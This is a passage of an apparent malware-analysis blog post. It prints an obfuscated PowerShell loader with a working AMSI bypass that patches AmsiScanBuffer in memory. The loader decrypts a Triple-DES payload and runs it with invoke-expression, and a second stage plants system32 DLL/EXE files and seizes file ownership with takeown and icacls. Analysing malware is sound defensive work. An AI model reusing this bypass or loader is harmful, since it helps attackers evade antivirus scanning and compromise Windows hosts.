#cccccc">$([char]13+[char]10+[char]13+[char]10+[char]117+[char]115+[char]105+[char]110+[char]103+[char]32+[char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]59+[char]13+[char]10+[char]117+[char]115+[char]105+[char]110+[char]103+[char]32+[char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]82+[char]117+[char]110+[char]116+[char]105+[char]109+[char]101+[char]46+[char]73+[char]110+[char]116+[char]101+[char]114+[char]111+[char]112+[char]83+[char]101+[char]114+[char]118+[char]105+[char]99+[char]101+[char]115+[char]59+[char]13+[char]10+[char]13+[char]10+[char]112+[char]117+[char]98+[char]108+[char]105+[char]99+[char]32+[char]99+[char]108+[char]97+[char]115+[char]115+[char]32+[char]90+[char]74+[char]97+[char]101+[char]88+[char]82+[char]72+[char]32+[char]123+[char]13+[char]10+[char]13+[char]10+[char]32+[char]32+[char]32+[char]32+[char]91+[char]68+[char]108+[char]108+[char]73+[char]109+[char]112+[char]111+[char]114+[char]116+[char]40+[char]34+[char]107+[char]101+[char]114+[char]110+[char]101+[char]108+[char]51+[char]50+[char]34+[char]44+[char]32+[char]69+[char]110+[char]116+[char]114+[char]121+[char]80+[char]111+[char]105+[char]110+[char]116+[char]61+[char]34+[char]71+[char]101+[char]116+[char]80+[char]114+[char]111+[char]99+[char]65+[char]100+[char]100+[char]114+[char]101+[char]115+[char]115+[char]34+[char]41+[char]93+[char]13+[char]10+[char]32+[char]32+[char]32+[char]32+[char]112+[char]117+[char]98+[char]108+[char]105+[char]99+[char]32+[char]115+[char]116+[char]97+[char]116+[char]105+[char]99+[char]32+[char]101+[char]120+[char]116+[char]101+[char]114+[char]110+[char]32+[char]73+[char]110+[char]116+[char]80+[char]116+[char]114+[char]32+[char]103+[char]112+[char]97+[char]40+[char]73+[char]110+[char]116+[char]80+[char]116+[char]114+[char]32+[char]104+[char]77+[char]111+[char]100+[char]117+[char]108+[char]101+[char]44+[char]32+[char]115+[char]116+[char]114+[char]105+[char]110+[char]103+[char]32+[char]112+[char]114+[char]111+[char]99+[char]78+[char]97+[char]109+[char]101+[char]41+[char]59+[char]13+[char]10+[char]13+[char]10+[char]32+[char]32+[char]32+[char]32+[char]91+[char]68+[char]108+[char]108+[char]73+[char]109+[char]112+[char]111+[char]114+[char]116+[char]40+[char]34+[char]107+[char]101+[char]114+[char]110+[char]101+[char]108+[char]51+[char]50+[char]34+[char]44+[char]32+[char]69+[char]110+[char]116+[char]114+[char]121+[char]80+[char]111+[char]105+[char]110+[char]116+[char]61+[char]34+[char]76+[char]111+[char]97+[char]100+[char]76+[char]105+[char]98+[char]114+[char]97+[char]114+[char]121+[char]34+[char]41+[char]93+[char]13+[char]10+[char]32+[char]32+[char]32+[char]32+[char]112+[char]117+[char]98+[char]108+[char]105+[char]99+[char]32+[char]115+[char]116+[char]97+[char]116+[char]105+[char]99+[char]32+[char]101+[char]120+[char]116+[char]101+[char]114+[char]110+[char]32+[char]73+[char]110+[char]116+[char]80+[char]116+[char]114+[char]32+[char]108+[char]108+[char]105+[char]98+[char]40+[char]115+[char]116+[char]114+[char]105+[char]110+[char]103+[char]32+[char]110+[char]97+[char]109+[char]101+[char]41+[char]59+[char]13+[char]10+[char]13+[char]10+[char]32+[char]32+[char]32+[char]32+[char]91+[char]68+[char]108+[char]108+[char]73+[char]109+[char]112+[char]111+[char]114+[char]116+[char]40+[char]34+[char]107+[char]101+[char]114+[char]110+[char]101+[char]108+[char]51+[char]50+[char]34+[char]44+[char]32+[char]69+[char]110+[char]116+[char]114+[char]121+[char]80+[char]111+[char]105+[char]110+[char]116+[char]61+[char]34+[char]86+[char]105+[char]114+[char]116+[char]117+[char]97+[char]108+[char]80+[char]114+[char]111+[char]116+[char]101+[char]99+[char]116+[char]34+[char]41+[char]93+[char]13+[char]10+[char]32+[char]32+[char]32+[char]32+[char]112+[char]117+[char]98+[char]108+[char]105+[char]99+[char]32+[char]115+[char]116+[char]97+[char]116+[char]105+[char]99+[char]32+[char]101+[char]120+[char]116+[char]101+[char]114+[char]110+[char]32+[char]98+[char]111+[char]111+[char]108+[char]32+[char]118+[char]112+[char]114+[char]40+[char]73+[char]110+[char]116+[char]80+[char]116+[char]114+[char]32+[char]108+[char]112+[char]65+[char]100+[char]100+[char]114+[char]101+[char]115+[char]115+[char]44+[char]32+[char]85+[char]73+[char]110+[char]116+[char]80+[char]116+[char]114+[char]32+[char]100+[char]119+[char]83+[char]105+[char]122+[char]101+[char]44+[char]32+[char]117+[char]105+[char]110+[char]116+[char]32+[char]102+[char]108+[char]78+[char]101+[char]119+[char]80+[char]114+[char]111+[char]116+[char]101+[char]99+[char]116+[char]44+[char]32+[char]111+[char]117+[char]116+[char]32+[char]117+[char]105+[char]110+[char]116+[char]32+[char]108+[char]112+[char]102+[char]108+[char]79+[char]108+[char]100+[char]80+[char]114+[char]111+[char]116+[char]101+[char]99+[char]116+[char]41+[char]59+[char]13+[char]10+[char]13+[char]10+[char]125+[char]13+[char]10)</span> 

<span style="color: #cd00cd">Add-Type</span> <span style="color: #00cdcd">$fuapm</span>

<span style="color: #00cdcd">$hcxku</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">[ZJaeXRH]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">llib(</span><span style="color: #00cdcd">$8j5w</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$i6l7</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$e7zp</span><span style="color: #cccccc">($([char](202-105)+[char](215-106)))</span> <span style="color: #cccccc">+</span> <span style="color: #00cdcd">$8j5w</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$i6l7</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$e7zp</span><span style="color: #cccccc">($([char](165-50)+[char](157-52)+[char](102-56)+[char](219-119)+[char](219-111)+[char](158-50))))</span>
<span style="color: #00cdcd">$3qsr18w91</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">[ZJaeXRH]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">gpa(</span><span style="color: #00cdcd">$hcxku</span><span style="color: #cccccc">,</span> <span style="color: #00cdcd">$8j5w</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$i6l7</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$e7zp</span><span style="color: #cccccc">($([char](173-108)+[char](166-57)+[char](212-97)+[char](220-115)))</span> <span style="color: #cccccc">+</span> <span style="color: #00cdcd">$8j5w</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$i6l7</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$e7zp</span><span style="color: #cccccc">($([char](203-120)+[char](150-51)+[char](202-105)+[char](224-114)))</span> <span style="color: #cccccc">+</span> <span style="color: #00cdcd">$8j5w</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$i6l7</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$e7zp</span><span style="color: #cccccc">($([char](123-57)+[char](231-114)+[char](218-116)+[char](220-118)+[char](223-122)+[char](163-49))))</span>
<span style="color: #00cdcd">$3qsr1</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">0</span>
<span style="color: #cccccc">[ZJaeXRH]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">vpr(</span><span style="color: #00cdcd">$3qsr18w91</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">[uint32]5,</span> <span style="color: #cccccc">(114-50),</span> <span style="color: #cccccc">[ref]</span><span style="color: #00cdcd">$3qsr1</span><span style="color: #cccccc">)</span>
<span style="color: #00cdcd">$huzro</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">[Byte[]]</span> <span style="color: #cccccc">((236-52),</span> <span style="color: #cccccc">(199-112),</span> <span style="color: #cccccc">(103-103),</span> <span style="color: #cccccc">(109-102),</span> <span style="color: #cccccc">(225-97),</span> <span style="color: #cccccc">(307-112))</span>
<span style="color: #cccccc">[System.Runtime.InteropServices.Marshal]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">Copy(</span><span style="color: #00cdcd">$huzro</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">0,</span> <span style="color: #00cdcd">$3qsr18w91</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">6)</span> 



<span style="color: #cdcd00">function</span> <span style="color: #cccccc">svcngnxjld([String]</span> <span style="color: #00cdcd">$mfffiodqqc</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">[String]</span> <span style="color: #00cdcd">$slmpshopis</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">[String]</span> <span style="color: #00cdcd">$djjfyveuv</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">[String]</span> <span style="color: #00cdcd">$file</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">[String]</span> <span style="color: #00cdcd">$traert</span><span style="color: #cccccc">)</span>
<span style="color: #cccccc">{</span>
<span style="color: #00cdcd">$sotcschdvz</span> <span style="color: #cccccc">=</span> <span style="color: #cd0000">&quot;SKgZKXBx2b0toIsCKYwM7LudLVt6CPcMvrXBGKe6f1XdpnmZnHdgoycAGhHCDC [Sliced due to size]&quot;</span>
<span style="color: #00cdcd">$odjvju4</span> <span style="color: #cccccc">=</span> <span style="color: #cd00cd">New-Object</span> <span style="color: #cccccc">System.Text.ASCIIEncoding</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$wujgeiqzled</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$odjvju4</span><span style="color: #cccccc">.GetBytes(</span><span style="color: #cd0000">&quot;CPFREKVVTXFJWQMI&quot;</span><span style="color: #cccccc">)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$sotcschdvza</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">[Convert]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">FromBase64String(</span><span style="color: #00cdcd">$sotcschdvz</span><span style="color: #cccccc">)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$uzurhg</span> <span style="color: #cccccc">=</span> <span style="color: #cd00cd">New-Object</span> <span style="color: #cccccc">System.Security.Cryptography.PasswordDeriveBytes(</span><span style="color: #00cdcd">$mfffiodqqc</span><span style="color: #cccccc">,</span> <span style="color: #00cdcd">$odjvju4</span><span style="color: #cccccc">.GetBytes(</span><span style="color: #00cdcd">$slmpshopis</span><span style="color: #cccccc">),</span> <span style="color: #cd0000">&quot;SHA1&quot;</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">2)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #cccccc">[Byte[]]</span> <span style="color: #00cdcd">$ioptxhzybb</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$uzurhg</span><span style="color: #cccccc">.GetBytes(16)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$qlxmcfbvep</span> <span style="color: #cccccc">=</span> <span style="color: #cd00cd">New-Object</span> <span style="color: #cccccc">System.Security.Cryptography.TripleDESCryptoServiceProvider</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$qlxmcfbvep</span><span style="color: #cccccc">.Mode</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">[System.Security.Cryptography.CipherMode]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">CBC</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #cccccc">[Byte[]]</span> <span style="color: #00cdcd">$hvdsbxeqhg</span> <span style="color: #cccccc">=</span> <span style="color: #cd00cd">New-Object</span> <span style="color: #cccccc">Byte[](</span><span style="color: #00cdcd">$sotcschdvza</span><span style="color: #cccccc">.Length)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$gecmqlqxed</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$qlxmcfbvep</span><span style="color: #cccccc">.CreateDecryptor(</span><span style="color: #00cdcd">$ioptxhzybb</span><span style="color: #cccccc">,</span> <span style="color: #00cdcd">$wujgeiqzled</span><span style="color: #cccccc">)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$imhfzqtejg</span> <span style="color: #cccccc">=</span> <span style="color: #cd00cd">New-Object</span> <span style="color: #cccccc">System.IO.MemoryStream(</span><span style="color: #00cdcd">$sotcschdvza</span><span style="color: #cccccc">,</span> <span style="color: #00cdcd">$True</span><span style="color: #cccccc">)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$bpcpgowjry</span> <span style="color: #cccccc">=</span> <span style="color: #cd00cd">New-Object</span> <span style="color: #cccccc">System.Security.Cryptography.CryptoStream(</span><span style="color: #00cdcd">$imhfzqtejg</span><span style="color: #cccccc">,</span> <span style="color: #00cdcd">$gecmqlqxed</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">[System.Security.Cryptography.CryptoStreamMode]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">Read)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$zpchfmdwwk</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$bpcpgowjry</span><span style="color: #cccccc">.Read(</span><span style="color: #00cdcd">$hvdsbxeqhg</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">0,</span> <span style="color: #00cdcd">$hvdsbxeqhg</span><span style="color: #cccccc">.Length)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$imhfzqtejg</span><span style="color: #cccccc">.Close()</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$bpcpgowjry</span><span style="color: #cccccc">.Close()</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$qlxmcfbvep</span><span style="color: #cccccc">.Clear()</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$r</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$hvdsbxeqhg</span><span style="color: #cccccc">[3..(</span><span style="color: #00cdcd">$hvdsbxeqhg</span><span style="color: #cccccc">.Length-1)]</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span> 
<span style="color: #cdcd00">return</span> <span style="color: #00cdcd">$odjvju4</span><span style="color: #cccccc">.GetString(</span><span style="color: #00cdcd">$hvdsbxeqhg</span><span style="color: #cccccc">)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #cccccc">}</span>
<span style="color: #00cdcd">$swzsujyskx</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">svcngnxjld</span> <span style="color: #cd0000">&quot;sm6nowy0t4p739hui281xljbvqc5eakr&quot;</span> <span style="color: #cd0000">&quot;15hx732n8cwmfyok94rgvid0zaluspej&quot;</span> <span style="color: #cd0000">&quot;15hx732n8cwmfyok94rgvid0zaluspej&quot;</span> <span style="color: #cd0000">&quot;itrt.jpg&quot;</span> <span style="color: #cd0000">&quot;read&quot;</span>

<span style="color: #cd00cd">invoke-expression</span> <span style="color: #00cdcd">$swzsujyskx</span>
</pre></td></tr></table></div>
<br /><br />

The second-stage payload also stards with an amsi bypass:<br />
<div style="background: #000000; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%">1</pre></td><td><pre style="margin: 0; line-height: 125%"><span style="color: #cd00cd">set-aliasinvokecommandexpandstringinvoke</span><span style="color: #cccccc">-expressionamsi.dllAmsiScanBuffer</span><span style="color: #cccccc; border: 1px solid #FF0000">@Â¸</span><span style="color: #cccccc">W</span>
</pre></td></tr></table></div>
<br />

Afterwards it seems to get data out of a triple-des encrypted string:<br />
<div style="background: #000000; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%"> 1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24</pre></td><td><pre style="margin: 0; line-height: 125%"><span style="color: #cdcd00">function</span> <span style="color: #cccccc">getcontent([String]</span> <span style="color: #00cdcd">$parameter1</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">[String]</span> <span style="color: #00cdcd">$parameter2</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">[String]</span> <span style="color: #00cdcd">$djjfyveuv</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">[String]</span> <span style="color: #00cdcd">$file</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">[String]</span> <span style="color: #00cdcd">$operation</span><span style="color: #cccccc">)</span>
<span style="color: #cccccc">{</span>
<span style="color: #00cdcd">$base64string</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">[Payload]</span>
<span style="color: #00cdcd">$targetbuffer</span> <span style="color: #cccccc">=</span> <span style="color: #cd00cd">New-Object</span> <span style="color: #cccccc">System.Text.ASCIIEncoding</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$bytesfromtargetbuffer</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$targetbuffer</span><span style="color: #cccccc">.GetBytes(</span><span style="color: #cd0000">&quot;CPFREKVVTXFJWQMI&quot;</span><span style="color: #cccccc">)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$decoded_b64</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">[Convert]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">FromBase64String(</span><span style="color: #00cdcd">$base64string</span><span style="color: #cccccc">)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$shapassword</span> <span style="color: #cccccc">=</span> <span style="color: #cd00cd">New-Object</span> <span style="color: #cccccc">System.Security.Cryptography.PasswordDeriveBytes(</span><span style="color: #00cdcd">$parameter1</span><span style="color: #cccccc">,</span> <span style="color: #00cdcd">$targetbuffer</span><span style="color: #cccccc">.GetBytes(</span><span style="color: #00cdcd">$parameter2</span><span style="color: #cccccc">),</span> <span style="color: #cd0000">&quot;SHA1&quot;</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">2)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #cccccc">[Byte[]]</span> <span style="color: #00cdcd">$cutshapassword</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$shapassword</span><span style="color: #cccccc">.GetBytes(16)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$tripledes</span> <span style="color: #cccccc">=</span> <span style="color: #cd00cd">New-Object</span> <span style="color: #cccccc">System.Security.Cryptography.TripleDESCryptoServiceProvider</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$tripledes</span><span style="color: #cccccc">.Mode</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">[System.Security.Cryptography.CipherMode]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">CBC</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #cccccc">[Byte[]]</span> <span style="color: #00cdcd">$b64length</span> <span style="color: #cccccc">=</span> <span style="color: #cd00cd">New-Object</span> <span style="color: #cccccc">Byte[](</span><span style="color: #00cdcd">$decoded_b64</span><span style="color: #cccccc">.Length)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$decryptor</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$tripledes</span><span style="color: #cccccc">.CreateDecryptor(</span><span style="color: #00cdcd">$cutshapassword</span><span style="color: #cccccc">,</span> <span style="color: #00cdcd">$bytesfromtargetbuffer</span><span style="color: #cccccc">)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$decoded_b64stream</span> <span style="color: #cccccc">=</span> <span style="color: #cd00cd">New-Object</span> <span style="color: #cccccc">System.IO.MemoryStream(</span><span style="color: #00cdcd">$decoded_b64</span><span style="color: #cccccc">,</span> <span style="color: #00cdcd">$True</span><span style="color: #cccccc">)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$cryptostream</span> <span style="color: #cccccc">=</span> <span style="color: #cd00cd">New-Object</span> <span style="color: #cccccc">System.Security.Cryptography.CryptoStream(</span><span style="color: #00cdcd">$decoded_b64stream</span><span style="color: #cccccc">,</span> <span style="color: #00cdcd">$decryptor</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">[System.Security.Cryptography.CryptoStreamMode]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">Read)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$cryptostream</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$cryptostream</span><span style="color: #cccccc">.Read(</span><span style="color: #00cdcd">$b64length</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">0,</span> <span style="color: #00cdcd">$b64length</span><span style="color: #cccccc">.Length)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$decoded_b64stream</span><span style="color: #cccccc">.Close()</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$cryptostream</span><span style="color: #cccccc">.Close()</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$tripledes</span><span style="color: #cccccc">.Clear()</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #00cdcd">$r</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$b64length</span><span style="color: #cccccc">[3..(</span><span style="color: #00cdcd">$b64length</span><span style="color: #cccccc">.Length-1)]</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span> 
<span style="color: #cdcd00">return</span> <span style="color: #00cdcd">$targetbuffer</span><span style="color: #cccccc">.GetString(</span><span style="color: #00cdcd">$b64length</span><span style="color: #cccccc">)</span><span style="color: #cccccc; border: 1px solid #FF0000">;</span>
<span style="color: #cccccc">}</span>
<span style="color: #00cdcd">$commandtoexecute</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">getcontent</span> <span style="color: #cd0000">&quot;sm6nowy0t4p739hui281xljbvqc5eakr&quot;</span> <span style="color: #cd0000">&quot;15hx732n8cwmfyok94rgvid0zaluspej&quot;</span> <span style="color: #cd0000">&quot;15hx732n8cwmfyok94rgvid0zaluspej&quot;</span> <span style="color: #cd0000">&quot;itrt.jpg&quot;</span> <span style="color: #cd0000">&quot;read&quot;</span>

<span style="color: #cd00cd">invoke-expression</span> <span style="color: #00cdcd">$commandtoexecute</span>
</pre></td></tr></table></div>
<br /><br />


When analysing it dynamically we're able to extract the following commands:<br />
<!-- HTML generated using hilite.me --><div style="background: #000000; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%">  1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159</pre></td><td><pre style="margin: 0; line-height: 125%"><span style="color: #cccccc">[System.IntPtr]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">Size</span>
<span style="color: #cdcd00">if</span><span style="color: #cccccc">([System.IntPtr]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">Size</span> <span style="color: #3399cc">-eq</span> <span style="color: #cccccc">4){</span>


<span style="color: #00cdcd">$giruhabg</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$dgiusjeja</span>
<span style="color: #00cdcd">$rousjg</span> <span style="color: #cccccc">=</span> <span style="color: #cd0000">&quot;$fldr&quot;</span><span style="color: #cccccc">+</span><span style="color: #00cdcd">$rf</span>

<span style="color: #cccccc">goeogha31</span> <span style="color: #cccccc">-giruhabg</span> <span style="color: #00cdcd">$giruhabg</span> <span style="color: #cccccc">-rousjg</span> <span style="color: #00cdcd">$rousjg</span>
<span style="color: #000080">#cat log_settup*.txt|sc 12444.txt</span>
<span style="color: #00cdcd">$giruhabg</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$otiiahj</span>
<span style="color: #00cdcd">$rousjg</span> <span style="color: #cccccc">=</span> <span style="color: #cd0000">&quot;$fldr&quot;</span><span style="color: #cccccc">+</span><span style="color: #00cdcd">$bf</span>
<span style="color: #cccccc">goeogha31</span> <span style="color: #cccccc">-giruhabg</span> <span style="color: #00cdcd">$giruhabg</span> <span style="color: #cccccc">-rousjg</span> <span style="color: #00cdcd">$rousjg</span>


<span style="color: #cccccc">}</span>
<span style="color: #cdcd00">else</span><span style="color: #cccccc">{</span>
<span style="color: #00cdcd">$giruhabg</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$dgiusjeja64</span>
<span style="color: #00cdcd">$rousjg</span> <span style="color: #cccccc">=</span> <span style="color: #cd0000">&quot;$fldr&quot;</span><span style="color: #cccccc">+</span><span style="color: #00cdcd">$rf</span>

<span style="color: #cccccc">goeogha31</span> <span style="color: #cccccc">-giruhabg</span> <span style="color: #00cdcd">$giruhabg</span> <span style="color: #cccccc">-rousjg</span> <span style="color: #00cdcd">$rousjg</span>
<span style="color: #000080">#cat log_settup*.txt|sc 12444.txt</span>

<span style="color: #00cdcd">$giruhabg</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$otiiahj64</span>
<span style="color: #00cdcd">$rousjg</span> <span style="color: #cccccc">=</span> <span style="color: #cd0000">&quot;$fldr&quot;</span><span style="color: #cccccc">+</span><span style="color: #00cdcd">$bf</span>
<span style="color: #cccccc">goeogha31</span> <span style="color: #cccccc">-giruhabg</span> <span style="color: #00cdcd">$giruhabg</span> <span style="color: #cccccc">-rousjg</span> <span style="color: #00cdcd">$rousjg</span>


<span style="color: #cccccc">}</span>
<span style="color: #00cdcd">$giruhabg</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$cfg</span>
<span style="color: #00cdcd">$rousjg</span> <span style="color: #cccccc">=</span> <span style="color: #cd0000">&quot;$fldr&quot;</span><span style="color: #cccccc">+</span><span style="color: #00cdcd">$cf</span>
<span style="color: #cccccc">goeogha31</span> <span style="color: #cccccc">-giruhabg</span> <span style="color: #00cdcd">$giruhabg</span> <span style="color: #cccccc">-rousjg</span> <span style="color: #00cdcd">$rousjg</span>



<span style="color: #00cdcd">$giruhabg</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$clip</span>
<span style="color: #00cdcd">$rousjg</span> <span style="color: #cccccc">=</span> <span style="color: #cd0000">&quot;$env:systemroot\system32\rdpclip.exe&quot;</span>


<span style="color: #cdcd00">If</span> <span style="color: #cccccc">((</span><span style="color: #cd00cd">Test-Path</span> <span style="color: #00cdcd">$rousjg</span><span style="color: #cccccc">)</span> <span style="color: #3399cc">-eq</span> <span style="color: #00cdcd">$False</span><span style="color: #cccccc">)</span> <span style="color: #cccccc">{</span>
<span style="color: #cccccc">goeogha31</span> <span style="color: #cccccc">-giruhabg</span> <span style="color: #00cdcd">$giruhabg</span> <span style="color: #cccccc">-rousjg</span> <span style="color: #00cdcd">$rousjg</span>   <span style="color: #cccccc">}</span>


<span style="color: #00cdcd">$giruhabg</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$vmt</span>
<span style="color: #00cdcd">$rousjg</span> <span style="color: #cccccc">=</span> <span style="color: #cd0000">&quot;$env:systemroot\system32\rfxvmt.dll&quot;</span>

<span style="color: #cdcd00">If</span> <span style="color: #cccccc">((</span><span style="color: #cd00cd">Test-Path</span> <span style="color: #00cdcd">$rousjg</span><span style="color: #cccccc">)</span> <span style="color: #3399cc">-eq</span> <span style="color: #00cdcd">$False</span><span style="color: #cccccc">)</span> <span style="color: #cccccc">{</span>
<span style="color: #cccccc">goeogha31</span> <span style="color: #cccccc">-giruhabg</span> <span style="color: #00cdcd">$giruhabg</span> <span style="color: #cccccc">-rousjg</span> <span style="color: #00cdcd">$rousjg</span>
<span style="color: #cccccc">cd</span> <span style="color: #00cdcd">$env:systemroot</span><span style="color: #cccccc">\system32</span>

<span style="color: #cccccc">takeown.exe</span> <span style="color: #cccccc">/A</span> <span style="color: #cccccc">/F</span> <span style="color: #cccccc">rfxvmt.dll</span>

<span style="color: #cccccc">icacls.exe</span> <span style="color: #cccccc">rfxvmt.dll</span> <span style="color: #cccccc">/inheritance</span><span style="color: #cccccc; border: 1px solid #FF0000">:</span><span style="color: #cccccc">d</span>
<span style="color: #cccccc">icacls.exe</span> <span style="color: #cccccc">rfxvmt.dll</span> <span style="color: #cccccc">/setowner</span> <span style="color: #cd0000">&quot;NT SERVICE\TrustedInstaller&quot;</span>
<span style="color: #cccccc">icacls.exe</span> <span style="color: #cccccc">rfxvmt.dll</span> <span style="color: #cccccc">/grant</span> <span style="color: #cd0000">&quot;NT SERVICE\TrustedInstaller:F&quot;</span>

